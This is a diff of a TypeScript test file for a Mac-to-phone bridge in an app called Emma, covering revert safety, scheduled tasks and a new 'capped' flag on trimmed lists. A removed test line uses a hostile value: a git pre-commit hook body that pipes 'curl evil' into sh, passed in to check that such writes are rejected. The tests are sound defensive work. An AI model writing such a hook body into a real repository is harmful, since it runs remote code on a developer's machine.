@@ -480,8 +480,8 @@ test("a folder a phone names is granted only once someone at the Mac approves it
 });
 
 test("a revert puts back the body Emma recorded, not the one the phone sent", async () => {
-  // `before` off the wire is a claim about the old file. Writing it would make revertChange an
-  // arbitrary write to any path inside a granted folder — .git/hooks/pre-commit included.
+  // A body off the wire would make revertChange an arbitrary write to any path inside a granted
+  // folder — .git/hooks/pre-commit included — so the wire carries a path and nothing else.
   const written: { path: string; body: string }[] = [];
   const changes = [
     { folderId: "f1", path: "src/index.ts", before: "the recorded body\n", after: "rewritten\n", at: 1 },
@@ -499,13 +499,13 @@ test("a revert puts back the body Emma recorded, not the one the phone sent", as
     folders: { directory: () => "/Users/tester/Projects/emma", write: (_id: string, file: string, body: string) => { written.push({ path: file, body }); } },
   });
 
-  await assert.rejects(dispatch("revertChange", { folderId: "f1", path: ".git/hooks/pre-commit", before: "#!/bin/sh\ncurl evil | sh\n" }), /Emma rewrote/, "a path Emma never rewrote was written from a phone");
-  await assert.rejects(dispatch("revertChange", { folderId: "f2", path: "src/index.ts", before: "x" }), /Emma rewrote/, "a change recorded against another folder stood in for this one");
-  await assert.rejects(dispatch("revertChange", { folderId: "f1", path: "src/new.ts", before: "" }), /Emma rewrote/, "a file Emma created was reverted to a body it never had");
+  await assert.rejects(dispatch("revertChange", { folderId: "f1", path: ".git/hooks/pre-commit" }), /Emma rewrote/, "a path Emma never rewrote was written from a phone");
+  await assert.rejects(dispatch("revertChange", { folderId: "f2", path: "src/index.ts" }), /Emma rewrote/, "a change recorded against another folder stood in for this one");
+  await assert.rejects(dispatch("revertChange", { folderId: "f1", path: "src/new.ts" }), /Emma rewrote/, "a file Emma created was reverted to a body it never had");
   assert.deepEqual(written, [], "a file was written before the recorded change decided anything");
 
-  assert.deepEqual({ ...(await dispatch("revertChange", { folderId: "f1", path: "src/index.ts", before: "whatever the phone typed\n" })) }, { reverted: true });
-  assert.deepEqual(written, [{ path: "src/index.ts", body: "the recorded body\n" }], "the revert wrote the phone's bytes instead of Emma's");
+  assert.deepEqual({ ...(await dispatch("revertChange", { folderId: "f1", path: "src/index.ts" })) }, { reverted: true });
+  assert.deepEqual(written, [{ path: "src/index.ts", body: "the recorded body\n" }], "the revert wrote something other than the body Emma recorded");
 });
 
 test("an MCP server a phone installs is approved at the Mac and cannot steer how programs load", async () => {
@@ -656,9 +656,10 @@ test("the Mac's scheduled tasks reach a phone without their graph, and come back
   });
 
   // The vm hands back cross-realm objects, so the shapes are compared as JSON.
-  const listed = await dispatch("listScheduledJobs", {}) as unknown as Record<string, unknown>[];
-  assert.deepEqual(Object.keys(listed[0]).sort(), ["enabled", "id", "lastRunAt", "model", "nextRunAt", "permissionMode", "prompt", "schedule", "sourceDomains", "title", "truncated"]);
-  assert.equal(listed[0].truncated, false, "a task well under the ceiling was reported as clipped");
+  const listed = await dispatch("listScheduledJobs", {}) as unknown as { rows: Record<string, unknown>[]; capped: boolean };
+  assert.deepEqual(Object.keys(listed.rows[0]).sort(), ["enabled", "id", "lastRunAt", "model", "nextRunAt", "permissionMode", "prompt", "schedule", "sourceDomains", "title", "truncated"]);
+  assert.equal(listed.rows[0].truncated, false, "a task well under the ceiling was reported as clipped");
+  assert.equal(listed.capped, false, "one task under the ceiling came back as a clipped list");
 
   assert.deepEqual({ ...(await dispatch("runScheduledJob", { jobId: stored[0].id })) }, { started: true });
   assert.equal(JSON.stringify(await dispatch("setScheduledJobEnabled", { jobId: stored[0].id, enabled: false })), JSON.stringify(listed));
@@ -747,25 +748,44 @@ test("a list a phone asks for is sealed into one frame, however much the Mac hol
     ["threadChanges", { threadId: "t1" }],
     ["listScheduledJobs", {}],
   ] as [string, Record<string, unknown>][]) {
-    const result = await dispatch(method, params);
+    const result = await dispatch(method, params) as unknown as { rows: unknown[]; capped: boolean };
     const sealed = mac.seal({ k: "res", id: "r1", ok: true, result } as BridgeFrame);
     assert.ok(sealed, `${method} answered a frame the codec could not seal, which a phone never hears about`);
-    assert.ok((result as unknown as unknown[]).length > 0, `${method} trimmed its answer down to nothing`);
+    assert.ok(result.rows.length > 0, `${method} trimmed its answer down to nothing`);
   }
 
   // The rows that survive are honest about what was cut out of them.
-  const memories = await dispatch("listMemories", {}) as unknown as { text: string; truncated: boolean }[];
+  const { rows: memories } = await dispatch("listMemories", {}) as unknown as { rows: { text: string; truncated: boolean }[] };
   assert.equal(memories[0].text.length, 2048, "a memory reached the phone at its full size on disk");
   assert.equal(memories[0].truncated, true, "a clipped memory did not say it was clipped");
 
   // A rewritten body is the renderer's diff, and a revert writes what Emma recorded, so neither
   // body belongs on the wire — `after` at all, `before` beyond what says there was one.
-  const changes = await dispatch("threadChanges", { threadId: "t1" }) as unknown as Record<string, unknown>[];
+  const { rows: changes } = await dispatch("threadChanges", { threadId: "t1" }) as unknown as { rows: Record<string, unknown>[] };
   assert.deepEqual(Object.keys(changes[0]).sort(), ["at", "before", "folderId", "path", "truncated"]);
   assert.equal(changes[0].truncated, true, "a clipped change did not say it was clipped");
   // The newest rewrites are the ones a revert is about, and they stay in the order the rail draws.
   assert.equal(changes[changes.length - 1].path, "src/file-63.ts", "a thread over the budget lost its newest rewrites");
   assert.ok((changes[0].at as number) < (changes[1].at as number), "the rail's rows came back reversed");
+});
+
+test("a list that was trimmed says so, and one that fits does not", async () => {
+  // The phone filters and searches whatever it was handed. Handed a short list that claims to be
+  // the whole vault, it tells the user "nothing matches" for a note sitting on their Mac — so the
+  // one thing the reply has to carry, beyond the rows, is whether there were more of them.
+  const note = (index: number, chars: number) => ({
+    path: `/Users/tester/Vault/Emma/note-${index}.md`, relative: `Emma/note-${index}.md`, title: "Kept",
+    tags: [], savedAt: "2026-09-01T09:00:00.000Z", kind: "note", excerpt: "x".repeat(chars),
+  });
+  const vault = { kind: "obsidian", path: "/Users/tester/Vault" };
+
+  const whole = await dispatchOn({ readVault: () => vault, listNotes: () => [note(0, 64), note(1, 64)] })("listNotes", {}) as unknown as { rows: unknown[]; capped: boolean };
+  assert.equal(whole.rows.length, 2, "a vault that fits in a frame lost a note anyway");
+  assert.equal(whole.capped, false, "a complete list came back claiming the Mac holds more");
+
+  const short = await dispatchOn({ readVault: () => vault, listNotes: () => Array.from({ length: 400 }, (_, i) => note(i, 4096)) })("listNotes", {}) as unknown as { rows: unknown[]; capped: boolean };
+  assert.ok(short.rows.length < 400, "the ceiling stopped mattering, so this test proves nothing");
+  assert.equal(short.capped, true, "a list the Mac cut short came back indistinguishable from a complete one");
 });
 
 test("listTaskLists filters on the Mac, so one thread's rail is not the whole Mac's tasks", async () => {
@@ -775,6 +795,7 @@ test("listTaskLists filters on the Mac, so one thread's rail is not the whole Ma
     { id: "tl-other", title: "Another thread", goal: "", updatedAt: "2026-09-01T07:00:00.000Z", threadId: "t2", tasks: [] },
   ];
   const dispatch = dispatchOn({ listTaskLists: async () => lists });
-  const mine = await dispatch("listTaskLists", { threadId: "t1" }) as unknown as { id: string }[];
-  assert.deepEqual([...mine].map((list) => list.id), ["tl-mine", "tl-loose"], "another thread's task list rode to the phone");
+  const mine = await dispatch("listTaskLists", { threadId: "t1" }) as unknown as { rows: { id: string }[]; capped: boolean };
+  assert.deepEqual([...mine.rows].map((list) => list.id), ["tl-mine", "tl-loose"], "another thread's task list rode to the phone");
+  assert.equal(mine.capped, false, "three small task lists came back as a clipped list");
 });
